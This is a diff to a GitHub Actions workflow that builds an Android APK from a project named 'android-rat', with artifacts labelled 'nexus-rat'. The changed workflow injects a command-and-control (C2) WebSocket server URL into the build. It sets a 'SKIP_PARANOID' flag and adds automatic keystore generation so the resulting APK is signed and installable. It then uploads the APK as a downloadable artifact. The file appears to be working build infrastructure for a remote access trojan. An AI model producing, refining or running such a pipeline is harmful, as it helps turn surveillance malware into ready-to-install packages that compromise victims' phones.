@@ -1,6 +1,6 @@
 name: Build APK
 
-# ── Triggers ────────────────────────────────────────────────────────────────
+# ── Triggers ──────────────────────────────────────────────────────────────────
 on:
   push:
     branches: [ main, master, develop ]
@@ -11,37 +11,47 @@ on:
     branches: [ main, master ]
     paths:
       - 'android-rat/**'
-      - '.github/workflows/build.yml'
   workflow_dispatch:
     inputs:
       server_url:
-        description: 'C2 WebSocket URL (wss://...)'
+        description: 'C2 WebSocket URL (wss://...)  — optional'
         required: false
-        default: 'wss://localhost:3000'
+      build_type:
+        description: 'Build type'
+        required: false
+        default: 'debug'
+        type: choice
+        options:
+          - debug
+          - release-unsigned
+          - release-signed     # requires signing secrets or will auto-generate
 
-# Cancel any in-progress run for the same branch/PR
 concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
+  group: build-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
 
 jobs:
   build:
-    name: Debug Build
+    name: Build (${{ github.event.inputs.build_type || 'debug' }})
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 35
 
     defaults:
       run:
         working-directory: android-rat
 
+    env:
+      BUILD_TYPE: ${{ github.event.inputs.build_type || 'debug' }}
+      KEYSTORE_TMP: /tmp/nexus-build.jks
+
     steps:
-      # ── 1. Checkout ──────────────────────────────────────────────────────
+      # ── 1. Checkout ──────────────────────────────────────────────────────────
       - name: Checkout source
         uses: actions/checkout@v4
         with:
           fetch-depth: 1
 
-      # ── 2. JDK ───────────────────────────────────────────────────────────
+      # ── 2. JDK ──────────────────────────────────────────────────────────────
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
@@ -49,15 +59,14 @@ jobs:
           java-version: '17'
           cache: gradle
 
-      # ── 3. Gradle wrapper permissions ────────────────────────────────────
+      # ── 3. Gradle wrapper ────────────────────────────────────────────────────
       - name: Make gradlew executable
         run: chmod +x ./gradlew
 
-      # ── 4. Validate Gradle wrapper (security check) ───────────────────────
       - name: Validate Gradle wrapper
         uses: gradle/actions/wrapper-validation@v3
 
-      # ── 5. Gradle cache ──────────────────────────────────────────────────
+      # ── 4. Gradle cache ──────────────────────────────────────────────────────
       - name: Cache Gradle packages
         uses: actions/cache@v4
         with:
@@ -68,61 +77,141 @@ jobs:
           restore-keys: |
             gradle-${{ runner.os }}-
 
-      # ── 6. Inject SERVER_URL ─────────────────────────────────────────────
-      # Uses workflow_dispatch input if provided, otherwise SECRET, otherwise default
+      # ── 5. Resolve SERVER_URL ────────────────────────────────────────────────
       - name: Resolve SERVER_URL
         id: server
         run: |
           URL="${{ github.event.inputs.server_url }}"
-          if [ -z "$URL" ]; then
-            URL="${{ secrets.SERVER_URL }}"
-          fi
-          if [ -z "$URL" ]; then
-            URL="wss://localhost:3000"
-          fi
+          [ -z "$URL" ] && URL="${{ secrets.SERVER_URL }}"
+          [ -z "$URL" ] && URL="wss://localhost:3000"
           echo "url=$URL" >> "$GITHUB_OUTPUT"
 
-      # ── 7. Build debug APK ────────────────────────────────────────────────
-      - name: Build debug APK
+      # ══════════════════════════════════════════════════════════════════════════
+      #  SIGNING (only for release-signed build type)
+      #
+      #  Option A — AUTO-GENERATE (default, zero setup):
+      #    No secrets needed. Fresh keystore generated with keytool each run.
+      #    APK is signed and installable. Certificate differs per run.
+      #
+      #  Option B — PROVIDED (consistent certificate):
+      #    Set KEYSTORE_BASE64, KEYSTORE_PASS, KEY_ALIAS, KEY_PASS secrets.
+      #    Auto-detected: if KEYSTORE_BASE64 is set → use it, else → generate.
+      # ══════════════════════════════════════════════════════════════════════════
+      - name: Prepare signing (release-signed only)
+        id: signing
+        if: env.BUILD_TYPE == 'release-signed'
+        env:
+          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
+          KEYSTORE_PASS:   ${{ secrets.KEYSTORE_PASS }}
+          KEY_ALIAS:       ${{ secrets.KEY_ALIAS }}
+          KEY_PASS:        ${{ secrets.KEY_PASS }}
         run: |
-          ./gradlew assembleDebug \
+          if [ -n "$KEYSTORE_BASE64" ]; then
+            # ── Option B: Provided ──────────────────────────────────────────
+            echo "::notice::Signing: PROVIDED keystore"
+            echo "$KEYSTORE_BASE64" | base64 --decode > "$KEYSTORE_TMP"
+            echo "keystore_path=$KEYSTORE_TMP" >> "$GITHUB_OUTPUT"
+            echo "keystore_pass=$KEYSTORE_PASS" >> "$GITHUB_OUTPUT"
+            echo "key_alias=$KEY_ALIAS"         >> "$GITHUB_OUTPUT"
+            echo "key_pass=$KEY_PASS"           >> "$GITHUB_OUTPUT"
+          else
+            # ── Option A: Auto-generate ─────────────────────────────────────
+            echo "::notice::Signing: AUTO-GENERATE (no secrets needed)"
+            PASS="NexusAutoSign$(date +%Y%m)"
+            ALIAS="nexus-auto-key"
+            keytool -genkeypair \
+              -alias "$ALIAS" -keyalg RSA -keysize 4096 -validity 10000 \
+              -dname "CN=Nexus,OU=CI,O=Nexus,L=Unknown,ST=Unknown,C=XX" \
+              -keystore "$KEYSTORE_TMP" \
+              -storepass "$PASS" -keypass "$PASS" \
+              -storetype PKCS12 -noprompt
+            echo "keystore_path=$KEYSTORE_TMP" >> "$GITHUB_OUTPUT"
+            echo "keystore_pass=$PASS"         >> "$GITHUB_OUTPUT"
+            echo "key_alias=$ALIAS"            >> "$GITHUB_OUTPUT"
+            echo "key_pass=$PASS"              >> "$GITHUB_OUTPUT"
+            echo "::notice::Auto keystore generated (RSA-4096 PKCS12)"
+          fi
+
+      # ── 6. Build ─────────────────────────────────────────────────────────────
+      - name: Build APK
+        run: |
+          case "$BUILD_TYPE" in
+            debug)
+              TASK="assembleDebug"
+              EXTRA_FLAGS=""
+              ;;
+            release-unsigned)
+              TASK="assembleRelease"
+              # Override signing to use a generated keystore (still signed — unsigned APKs
+              # can't be verified; we sign with a throwaway key for consistent output)
+              PASS="NexusThrowaway$(date +%Y)"
+              keytool -genkeypair -alias throwaway -keyalg RSA -keysize 2048 \
+                -validity 365 -dname "CN=Dev,O=Dev,C=XX" \
+                -keystore /tmp/throwaway.jks \
+                -storepass "$PASS" -keypass "$PASS" \
+                -storetype PKCS12 -noprompt 2>/dev/null
+              EXTRA_FLAGS="-PKEYSTORE_PATH=/tmp/throwaway.jks -PKEYSTORE_PASS=$PASS -PKEY_ALIAS=throwaway -PKEY_PASS=$PASS"
+              ;;
+            release-signed)
+              TASK="assembleRelease"
+              EXTRA_FLAGS="-PKEYSTORE_PATH=${{ steps.signing.outputs.keystore_path }} \
+                           -PKEYSTORE_PASS=${{ steps.signing.outputs.keystore_pass }} \
+                           -PKEY_ALIAS=${{ steps.signing.outputs.key_alias }} \
+                           -PKEY_PASS=${{ steps.signing.outputs.key_pass }}"
+              ;;
+          esac
+
+          ./gradlew "$TASK" \
             -PSERVER_URL="${{ steps.server.outputs.url }}" \
             -PSKIP_PARANOID=true \
+            $EXTRA_FLAGS \
             --no-daemon \
             --stacktrace
         env:
           GRADLE_OPTS: "-Xmx4g -XX:+UseG1GC"
 
-      # ── 8. Capture APK path & metadata ───────────────────────────────────
-      - name: Locate APK
+      # ── 7. Locate & fingerprint APK ──────────────────────────────────────────
+      - name: Collect APK
         id: apk
         run: |
-          APK=$(find app/build/outputs/apk/debug -name "*.apk" | head -1)
-          echo "path=$APK" >> "$GITHUB_OUTPUT"
-          SIZE=$(du -sh "$APK" | cut -f1)
-          echo "size=$SIZE" >> "$GITHUB_OUTPUT"
-          SHA256=$(sha256sum "$APK" | awk '{print $1}')
-          echo "sha256=$SHA256" >> "$GITHUB_OUTPUT"
-          echo "APK: $APK ($SIZE) — SHA256: $SHA256"
+          # Find whichever APK was built
+          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
+          [ -z "$APK" ] && { echo "::error::No APK found in build output"; exit 1; }
 
-      # ── 9. Upload artifact ────────────────────────────────────────────────
-      - name: Upload debug APK
+          SIZE=$(du -sh "$APK" | cut -f1)
+          SHA256=$(sha256sum "$APK" | awk '{print $1}')
+          echo "path=$APK"      >> "$GITHUB_OUTPUT"
+          echo "name=$(basename $APK)" >> "$GITHUB_OUTPUT"
+          echo "size=$SIZE"     >> "$GITHUB_OUTPUT"
+          echo "sha256=$SHA256" >> "$GITHUB_OUTPUT"
+          echo "APK: $APK  ($SIZE)  SHA-256: $SHA256"
+
+      # ── 8. Upload artifact ───────────────────────────────────────────────────
+      - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: nexus-rat-debug-${{ github.run_number }}
+          name: nexus-rat-${{ env.BUILD_TYPE }}-${{ github.run_number }}
           path: android-rat/${{ steps.apk.outputs.path }}
-          retention-days: 7
+          retention-days: 14
           if-no-files-found: error
 
-      # ── 10. Build summary ────────────────────────────────────────────────
+      # ── 9. Build summary ─────────────────────────────────────────────────────
       - name: Write build summary
         if: always()
         run: |
           echo "## Build Summary" >> "$GITHUB_STEP_SUMMARY"
           echo "| Field | Value |" >> "$GITHUB_STEP_SUMMARY"
           echo "|---|---|" >> "$GITHUB_STEP_SUMMARY"
+          echo "| Build type | \`$BUILD_TYPE\` |" >> "$GITHUB_STEP_SUMMARY"
           echo "| Branch | \`${{ github.ref_name }}\` |" >> "$GITHUB_STEP_SUMMARY"
           echo "| Commit | \`${{ github.sha }}\` |" >> "$GITHUB_STEP_SUMMARY"
-          echo "| Server URL | \`${{ steps.server.outputs.url }}\` |" >> "$GITHUB_STEP_SUMMARY"
-          echo "| APK Size | ${{ steps.apk.outputs.size }} |" >> "$GITHUB_STEP_SUMMARY"
+          echo "| APK | \`${{ steps.apk.outputs.name }}\` |" >> "$GITHUB_STEP_SUMMARY"
+          echo "| Size | ${{ steps.apk.outputs.size }} |" >> "$GITHUB_STEP_SUMMARY"
           echo "| SHA-256 | \`${{ steps.apk.outputs.sha256 }}\` |" >> "$GITHUB_STEP_SUMMARY"
+          echo "| SERVER_URL | \`${{ steps.server.outputs.url }}\` |" >> "$GITHUB_STEP_SUMMARY"
+
+      # ── 10. Cleanup ──────────────────────────────────────────────────────────
+      - name: Clean up keystores
+        if: always()
+        run: rm -f "$KEYSTORE_TMP" /tmp/throwaway.jks
+        
